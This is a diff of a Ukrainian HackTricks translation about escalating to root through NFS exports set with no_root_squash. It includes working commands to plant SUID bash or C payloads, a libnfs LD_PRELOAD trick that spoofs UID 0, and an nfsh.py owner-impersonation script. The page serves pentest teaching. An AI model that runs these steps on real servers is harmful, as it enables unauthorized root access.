@@ -2,17 +2,19 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Основна інформація про Squashing
+## Основна інформація про squashing
 
-У разі використання NFS AUTH_SYS/AUTH_UNIX сервер виконує перевірку дозволів на файли на основі `uid` і `gid`, переданих у кожному RPC-запиті. Інші security flavors, наприклад Kerberos, використовують інші облікові дані, а сервер може зіставити числові облікові дані перед перевіркою дозволів.<sup>[[4]](#references)[[5]](#references)</sup>
+За використання NFS AUTH_SYS/AUTH_UNIX сервер перевіряє дозволи на файли на основі `uid` і `gid`, указаних у кожному RPC-запиті. Інші security flavors, як-от Kerberos, використовують інші облікові дані, а сервер може зіставляти числові облікові дані перед перевіркою дозволів.<sup>[[4]](#references)[[5]](#references)</sup>
 
-- **`all_squash`**: зіставляє кожен UID і GID з anonymous account, яка в Linux за замовчуванням має значення `nobody` (65534). `no_all_squash` є типовим значенням для запитів не від root.<sup>[[4]](#references)</sup>
-- **`root_squash`**: це типове значення в Linux; воно зіставляє запити з UID/GID 0 (root) з anonymous account. Інші UID і GID не підлягають squash.<sup>[[4]](#references)</sup>
-- **`no_root_squash`**: вимикає root squashing, тому запити з UID/GID 0 можуть оброблятися на сервері як запити від root.<sup>[[4]](#references)</sup>
+- **`all_squash`**: Зіставляє всі UID і GID з анонімним обліковим записом, який у Linux за замовчуванням має назву `nobody` (65534). Для запитів не від root за замовчуванням використовується `no_all_squash`.<sup>[[4]](#references)</sup>
+- **`root_squash`**: Це значення за замовчуванням у Linux. Воно зіставляє запити з UID/GID 0 (root) з анонімним обліковим записом; інші UID і GID не піддаються squashing.<sup>[[4]](#references)</sup>
+- **`no_root_squash`**: Вимикає root squashing, тож запити з UID/GID 0 можуть оброблятися на сервері як запити від root.<sup>[[4]](#references)</sup>
 
-Якщо дозволений client може підключити для запису export у **`/etc/exports`**, налаштований із **`no_root_squash`**, його запити з UID/GID 0 можуть записувати туди від імені root-користувача сервера.<sup>[[4]](#references)</sup>
+Якщо дозволений клієнт може підключити доступний для запису export, налаштований у **`/etc/exports`** з параметром **`no_root_squash`**, його запити з UID/GID 0 зможуть записувати туди від імені root на сервері.<sup>[[4]](#references)</sup>
 
-Докладніше про **NFS** дивіться:
+`root_squash` лише зіставляє UID/GID 0 з іншими значеннями; за AUTH_SYS **ненульові числові UID/GID** дозволеного клієнта все ще можуть збігатися з іншим обліковим записом на сервері. Тому доступний для запису export може стати шляхом до іншого облікового запису навіть за ввімкненого root squashing, якщо клієнт може створити файл із таким числовим ідентифікатором і сервер дозволяє доступ. Для передачі через SUID/SGID також перевірте власника створеного файла, доступ для виконання, стан `nosuid` у монтуванні на сервері, ACL і SELinux або інші політики. Самі лише шлях експорту, параметр `rw` чи збіг чисел не доводять, що клієнту дозволено доступ, export активний або обидва хости використовують однакове зіставлення ідентифікаторів. Пасивно перевірте `/etc/exports` і локальні метадані; під час перерахування не монтуйте новий ресурс і не створюйте тестовий файл.<sup>[[4]](#references)[[5]](#references)</sup>
+
+Детальніше про **NFS** читайте:
 
 {{#ref}}
 ../../network-services-pentesting/nfs-service-pentesting.md
@@ -20,11 +22,12 @@
 
 ## Ескалація привілеїв
 
-### Remote Exploit
+### Віддалений експлойт
 
 Варіант 1 із використанням bash:
-- На дозволеному client підключіть export для запису від імені root, скопіюйте **`/bin/bash`** у нього, встановіть його **SUID** bit і виконайте його з victim mount, у якому не використовується `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
-- Щоб uploaded file залишився власністю root, сервер має використовувати **`no_root_squash`**. Якщо root підлягає squash, SUID binary для іншого account можливий лише тоді, коли client може легітимно створити його або володіти ним із numeric UID/GID цього account.<sup>[[4]](#references)</sup>
+- На дозволеному клієнті під root підключіть доступний для запису export, скопіюйте до нього **`/bin/bash`**, установіть його біт **SUID** і запустіть його з монтування жертви, де не використовується `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
+    - Щоб завантажений файл залишився власністю root, на сервері має бути ввімкнено **`no_root_squash`**. Якщо root піддається squashing, створити SUID-бінарний файл для іншого облікового запису можна лише тоді, коли клієнт може легітимно створити його або стати його власником, використовуючи числовий UID/GID цього облікового запису.<sup>[[4]](#references)</sup>
+
 ```bash
 #Attacker, as root user
 mkdir /tmp/pe
@@ -37,9 +40,11 @@ chmod +s bash
 cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
-Option 2 за допомогою скомпільованого C-коду:
-- Змонтувати директорію з дозволеного клієнта, скопіювати скомпільований payload, який зловживає дозволами SUID, встановити його біт **SUID** і виконати його з victim (див. деякі [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
-- Ті самі обмеження, що й раніше
+
+Option 2 using compiled C code:
+- Змонтуйте директорію з дозволеного клієнта, скопіюйте туди скомпільований payload, який використовує дозволи SUID, установіть його біт **SUID** і виконайте на цільовій системі (див. [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
+    - Ті самі обмеження, що й раніше
+
 ```bash
 #Attacker, as root user
 gcc payload.c -o payload
@@ -53,51 +58,61 @@ chmod +s payload
 cd <SHAREDD_FOLDER>
 ./payload #ROOT shell
 ```
-### Локальний Exploit
+
+### Local Exploit
 
 > [!TIP]
-> Зверніть увагу: якщо ви можете створити **тунель зі своєї машини до машини жертви, ви все одно можете використати Remote-версію для експлуатації цього підвищення привілеїв, прокинувши необхідні порти**.\
-> Наведений нижче трюк корисний, коли `/etc/exports` обмежує export IP-адресою жертви: віддалений клієнт не може його змонтувати, але локальна техніка може працювати через share, уже змонтований на дозволеному хості.<sup>[[2]](#references)</sup>\
-> Для цього unprivileged методу libnfs export у **`/etc/exports`** має використовувати прапорець `insecure`, щоб процес міг використовувати незарезервований source port; `secure` є значенням за замовчуванням, хоча процесу, здатному прив’язати зарезервований порт, ця опція не потрібна.<sup>[[1]](#references)[[4]](#references)</sup>
+> Зверніть увагу: якщо ви можете створити **тунель зі своєї машини до машини-жертви, ви все одно можете скористатися Remote-версією для Exploit цієї ескалації привілеїв, прокинувши потрібні порти**.\
+> Наведений нижче прийом корисний, якщо `/etc/exports` обмежує доступ до експорту IP-адресою жертви: віддалений клієнт не може його змонтувати, але локальний метод може працювати через спільний ресурс, уже змонтований на дозволеному хості.<sup>[[2]](#references)</sup>\
+> Для цього методу libnfs без привілеїв в експорті в **`/etc/exports`** має бути встановлено прапорець `insecure`, щоб процес міг використовувати незарезервований вихідний порт; за замовчуванням використовується `secure`, хоча процесу, здатному прив’язатися до зарезервованого порту, ця опція не потрібна.<sup>[[1]](#references)[[4]](#references)</sup>
 
 ### Основна інформація
 
-Клієнт NFSv3 AUTH_UNIX додає свій effective UID, GID і групи до кожного виклику, а сервер використовує їх для перевірки permissions. Ця локальна техніка зловживає цією моделлю, підробляючи RPC credentials через [libnfs](https://github.com/sahlberg/libnfs); його preload-модуль підтримує перевизначення UID/GID у контексті NFS.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>
+Клієнт NFSv3 AUTH_UNIX передає свій ефективний UID, GID і групи в кожному виклику, а сервер використовує їх для перевірки дозволів. Цей локальний метод зловживає такою моделлю, підробляючи облікові дані RPC за допомогою [libnfs](https://github.com/sahlberg/libnfs); його preload-модуль підтримує перевизначення UID/GID у контексті NFS.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>
 
 #### Компіляція бібліотеки
 
-Приклад libnfs може потребувати адаптації для цільового kernel; у наведеному walkthrough окремо зазначено, що перед компіляцією preload-модуля потрібно закоментувати syscalls fallocate.<sup>[[1]](#references)[[2]](#references)</sup>
+Приклад libnfs може потребувати змін для цільового ядра; у наведеному тут посібнику зазначено, що перед компіляцією preload-модуля потрібно закоментувати системні виклики fallocate.<sup>[[1]](#references)[[2]](#references)</sup>
+
 ```bash
 ./bootstrap
 ./configure
 make
 gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
 ```
-#### Проведення Exploit
 
-У прикладі створюється невеликий C helper, який запускає shell, потім розміщується на share і використовується `ld_nfs.so` з UID 0 у контексті NFS, щоб зробити його SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>
+#### Виконання Exploit
+
+У прикладі створюється невелика допоміжна програма на C, яка запускає shell. Потім її розміщують у спільному каталозі та використовують `ld_nfs.so` з UID 0 у контексті NFS, щоб надати їй права SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>
 
 1. **Скомпілюйте код exploit:**
+
 ```bash
 cat pwn.c
 int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
 gcc pwn.c -o a.out
 ```
-2. **Розмістіть exploit на share та змініть його permissions, підробивши UID**.<sup>[[1]](#references)[[2]](#references)</sup>
+
+2. **Розмістіть exploit на спільному ресурсі та змініть його дозволи, підробивши UID**.<sup>[[1]](#references)[[2]](#references)</sup>
+
 ```bash
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
 ```
-3. **Виконайте exploit, щоб отримати root privileges**.<sup>[[2]](#references)</sup>
+
+3. **Виконайте exploit, щоб отримати права root**.<sup>[[2]](#references)</sup>
+
 ```bash
 /mnt/share/a.out
 #root
 ```
+
 ### Бонус: NFShell для прихованого доступу до файлів
 
-Після отримання доступу root цей шаблон `nfsh.py` встановлює effective UID на UID цільового файлу перед запуском команди, забезпечуючи доступ без рекурсивної зміни власника.<sup>[[2]](#references)</sup>
+Після отримання root-доступу цей шаблон `nfsh.py` встановлює ефективний UID як UID цільового файлу перед виконанням команди, надаючи доступ без рекурсивної зміни власника.<sup>[[2]](#references)</sup>
+
 ```python
 #!/usr/bin/env python
 # script from https://www.errno.fr/nfs_privesc.html
@@ -105,22 +120,25 @@ import sys
 import os
 
 def get_file_uid(filepath):
-try:
-uid = os.stat(filepath).st_uid
-except OSError as e:
-return get_file_uid(os.path.dirname(filepath))
-return uid
+    try:
+        uid = os.stat(filepath).st_uid
+    except OSError as e:
+        return get_file_uid(os.path.dirname(filepath))
+    return uid
 
 filepath = sys.argv[-1]
 uid = get_file_uid(filepath)
 os.setreuid(uid, uid)
 os.system(' '.join(sys.argv[1:]))
 ```
+
 Запустіть так:
+
 ```bash
 # ll ./mount/
 drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
 ```
+
 ## References
 
 - [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
